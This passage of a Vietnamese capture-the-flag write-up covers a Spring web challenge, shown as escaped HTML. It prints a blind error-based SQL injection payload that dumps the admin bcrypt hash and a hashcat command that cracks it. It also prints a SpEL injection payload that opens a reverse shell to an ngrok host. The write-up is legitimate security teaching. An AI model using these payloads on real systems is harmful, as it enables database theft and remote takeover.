&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@RequestMapping({&amp;#34;/api/v1&amp;#34;})
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class FoodController {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; @GetMapping({&amp;#34;/fetch-foods-by-category/{category}/{sorting}&amp;#34;})
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; List&amp;lt;Food&amp;gt; fetchFoodsByCategory(@PathVariable String category, @PathVariable String sorting) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return this.foodService.findByCategory(category, sorting);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;API nÃ y gá»i Ä‘áº¿n method &lt;code&gt;findByCategory&lt;/code&gt; náº±m táº¡i &lt;code&gt;/service/FoodServiceImpl.class&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public List&amp;lt;Food&amp;gt; findByCategory(String category, String sorting) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String jpqlQuery = &amp;#34;SELECT f FROM Food f WHERE f.category = :category ORDER BY &amp;#34; + sorting + &amp;#34; DESC&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return this.entityManager.createQuery(jpqlQuery, Food.class).setParameter(&amp;#34;category&amp;#34;, category).getResultList();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cá»™ng chuá»—i nhÆ° tháº¿ kia thÃ¬ sure kÃ¨o lÃ  dÃ­nh SQL Injection rá»“i =))), nhÆ°ng viá»‡c inject vÃ o HQL vá»›i DBMS Ä‘áº±ng sau lÃ  MySQL mÃ¬nh tháº¥y khÃ¡ khÃ³ khÄƒn, khi viá»‡c HQL xá»­ lÃ½ giá»›i háº¡n sá»‘ báº£ng, nÃ³ chá»‰ cÃ³ thá»ƒ select Ä‘Æ°á»£c giÃ¡ trá»‹ tá»« nhá»¯ng báº£ng náº±m trong cÃ¡c thá»±c thá»ƒ Ä‘Ã£ Ä‘Æ°á»£c map vÃ  khai bÃ¡o, nÃªn ta cÅ©ng khÃ´ng Ä‘á»¥ng Ä‘Æ°á»£c Ä‘áº¿n Ä‘Æ°á»£c infomation_schema hay gÃ¬ cáº£, chá»‰ cÃ³ thá»ƒ dump data trong cÃ¡c báº£ng hiá»‡n táº¡i thÃ´i.
LÃºc nÃ y mÃ¬nh nghÄ© trong Ä‘áº§u lÃ  lÃªn Ä‘Æ°á»£c admin báº±ng cÃ¡ch nÃ o, trong khi password Ä‘Æ°á»£c mÃ£ hÃ³a Bcrypt cÆ¡ chá»© :)), cháº£ nháº½ crack Ä‘áº¿n cháº¿t. Tháº­t báº¥t ngá» intended lÃ  crack password tháº­t (mÃ¬nh máº¥t pháº§n lá»›n thá»i gian cá»§a 2 ngÃ y Ä‘á»ƒ tÃ¬m cÃ¡ch thá»±c hiá»‡n cÃ¢u lá»‡nh update hay insert nhÆ°ng tháº¥t báº¡i).
ThÃ´i khÃ´ng dÃ i dÃ²ng, mÃ¬nh tiáº¿n hÃ nh craft payload extract data boolean based nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;extractvalue(null,concat(&amp;#39;~&amp;#39;,(select password from User u where u.username = &amp;#39;admin&amp;#39;),&amp;#39;~&amp;#39;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Náº¿u nhÆ° request select thÃ nh cÃ´ng, sáº½ tráº£ vá» lá»—i khÃ´ng thá»ƒ láº¥y resultSet vÃ¬ payload trigger lá»—i error based:
&lt;img src="https://hackmd.io/_uploads/By587p6tA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/S1jOm6atA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ²n náº¿u nhÆ° cÃ¢u query sai, thÃ¬ server sáº½ khÃ´ng trigger error based nÃªn sáº½ hiá»ƒn thá»‹ Ä‘Æ°á»£c thÃ´ng tin bÃ¬nh thÆ°á»ng:
&lt;img src="https://hackmd.io/_uploads/BJrC7p6K0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Váº­y lÃ  payload cá»§a mÃ¬nh work, nhÆ°ng káº¿t quáº£ thÃ¬ khÃ´ng Ä‘Æ°á»£c tráº£ ra, nÃªn giá» mÃ¬nh sáº½ craft Ä‘á»ƒ extract password báº±ng cÃ¡ch blind thÃ´i&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;extractvalue(null,concat(&amp;#39;~&amp;#39;,(select password from User u where u.username = &amp;#39;admin&amp;#39; and binary(substr(u.password,1,1)) = &amp;#39;$&amp;#39;),&amp;#39;~&amp;#39;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;VÃ¬ mÃ¬nh biáº¿t máº­t kháº©u Ä‘Æ°á»£c hash theo kiá»ƒu Bcrypt nÃªn Ä‘oáº¡n kÃ½ tá»± Ä‘áº§u lÃºc nÃ o cÅ©ng kiá»ƒu &lt;code&gt;$2a$10&lt;/code&gt;, thá»­ kÃ­ tá»± Ä‘áº§u lÃ  $ thÃ¬ payload Ä‘Ã£ tráº£ vá» lá»—i (Ä‘Ãºng nhÆ° dá»± Ä‘oÃ¡n):
&lt;img src="https://hackmd.io/_uploads/rJ7jV6ptR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»‘t rá»“i, Ä‘Æ°a vÃ o intruder thÃ´i, Bcrypt hash ra Ä‘á»™ dÃ i cá»‘ Ä‘á»‹nh lÃ  60.
&lt;img src="https://hackmd.io/_uploads/Bkk18pTtA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh cÃ³ Ä‘Æ°á»£c káº¿t quáº£ hash admin local lÃ : &lt;code&gt;$2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvynF9E7Q6e21sMi7tBRPqL8zvS&lt;/code&gt;, hashcat mÃ¬nh cÃ³ Ä‘Æ°á»£c pass local lÃ  admin =)), yáº¿u tháº­t
VÃ¡c payload sang challenge tháº­t, mÃ¬nh cÃ³ hash dump Ä‘Æ°á»£c lÃ : &lt;code&gt;$2a$10$vFWElvoCouv8LuyTzOCT8eMq4KSvvbxEPpwRdXcJvDkSmVUbmooTW&lt;/code&gt;
NhÃ©t hash vÃ o file hash-2, cháº¡y hashcat attack mode 3200 theo &lt;a class="link" href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener"
&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;hashcat -m 3200 -a 0 hash-2 /usr/share/wordlists/rockyou.txt --force
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/HylE366FR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh cÃ³ máº­t kháº©u admin táº¡i web challenge lÃ  &lt;code&gt;adidas&lt;/code&gt;, quÃ¡ yáº¿u =)))&lt;/p&gt;
&lt;h3 id="spel-injection-in-fetchalluser"&gt;SpEL Injection in fetchAllUser
&lt;/h3&gt;&lt;p&gt;Leo lÃªn Ä‘Æ°á»£c admin, mÃ¬nh diff code vá»›i project cÃ³ trÃªn github thÃ¬ tháº¥y Ä‘oáº¡n code fetchAllUser dÃ­nh lá»—i parseExpression tÃªn cá»§a user, chá»©c nÄƒng nÃ y náº±m táº¡i api /api/v1/admin vá»‘n chá»‰ Ä‘Æ°á»£c truy cáº­p khi ngÆ°á»i dÃ¹ng cÃ³ role ADMIN:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;RequestMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/api/v1/admin&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="n"&gt;UserController&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;GetMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/fetch-all-users&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;fetchUsersByUsers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;userService&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchAllUsers&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;Transactional&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;readOnly&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;fetchAllUsers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;userRepository&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ExpressionParser&lt;/span&gt; &lt;span class="n"&gt;userParser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SpelExpressionParser&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Iterator&lt;/span&gt; &lt;span class="n"&gt;var3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;var3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hasNext&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;User&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;var3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Expression&lt;/span&gt; &lt;span class="n"&gt;expression&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;userParser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parseExpression&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getUsername&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;var6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;expression&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;var7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Giá» mÃ¬nh Ä‘Ã£ hiá»ƒu lÃ­ do táº¡i sao láº¡i kÃ©o username lÃªn 300 kÃ­ tá»± khi ban Ä‘áº§u cÃ³ 15 kÃ­ tá»± thÃ´i =))
Giá» mÃ¬nh sáº½ register payload reverse shell xem sao, payload reverse shell mÃ¬nh tham kháº£o tá»« &lt;a class="link" href="https://github.com/welk1n/ReverseShell-Java" target="_blank" rel="noopener"
&gt;https://github.com/welk1n/ReverseShell-Java&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;T(java.lang.Runtime).getRuntime().exec(&amp;#39;bash -c $@|bash 0 echo bash -i &amp;gt;&amp;amp; /dev/tcp/0.tcp.ap.ngrok.io/14482 0&amp;gt;&amp;amp;1&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ChÃ¨n payload vÃ o username, mÃ¬nh báº¯t intercept cho tiá»‡n:
&lt;img src="https://hackmd.io/_uploads/H1vkkCTtC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Gá»­i request vÃ  mÃ¬nh rev shell thÃ nh cÃ´ng:
&lt;img src="https://hackmd.io/_uploads/S15-yA6Y0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sau Ä‘Ã³ lÃ  khoáº£ng thá»i gian mÃ¬nh Ä‘i tÃ¬m flag =)), tÃ¬m á»Ÿ cÃ¡c file enciron hay há»‡ thá»‘ng khÃ´ng cÃ³, mÃ¬nh tÃ¬m cáº£ á»Ÿ db nhÆ°ng cÅ©ng khÃ´ng cÃ³:
&lt;img src="https://hackmd.io/_uploads/By9o7CTFC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh ngá»‘ quÃ¡, khÃ´ng nháº­n ra lÃ  flag náº±m ngay táº¡i thÆ° má»¥c chá»©a file war mÃ  cá»© Ä‘i tÃ¬m =)) (mÃ¬nh khÃ´ng Ä‘á»ƒ Ã½ tÃªn file)
&lt;img src="https://hackmd.io/_uploads/SkxIX0aFA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;strong&gt;Flag:&lt;/strong&gt; crew{BearBurger_is_on_sale!_LINZ_IS_HERE}&lt;/p&gt;
&lt;h3 id="another-workaround-to-admin"&gt;Another Workaround to Admin
&lt;/h3&gt;&lt;p&gt;Khi mÃ¬nh Ä‘i há»i nhá»¯ng ngÆ°á»i Ä‘Ã£ solve Ä‘Æ°á»£c challenge thÃ¬ nháº­n Ä‘Æ°á»£c cÃ¡ch khÃ¡c vá»›i cÃ¡ch intended cá»§a tÃ¡c giáº£, Ä‘Ã³ lÃ  khai thÃ¡c mass assignment vÃ o register Ä‘á»ƒ táº¡o thÃªm 1 role ná»¯a cho mÃ¬nh.
Äoáº¡n code xá»­ lÃ½ cá»§a chá»©c nÄƒng register khÃ¡ Ä‘Æ¡n giáº£n, nÃ³ chá»‰ hash máº­t kháº©u trÆ°á»›c khi lÆ°u vÃ o báº£ng user, vÃ  lÆ°u 1 hÃ ng mang luÃ´n giÃ¡ trá»‹ CUSTOMER vÃ o báº£ng roles:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public void registerUser(User user) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; user.setPassword(this.passwordEncoder.encode(user.getPassword()));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; this.userRepository.save(user);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; this.roleRepository.save(new Role(user.getUserID()));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;....
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public Role(int userID) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; this.userID = userID;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; this.name = &amp;#34;CUSTOMER&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
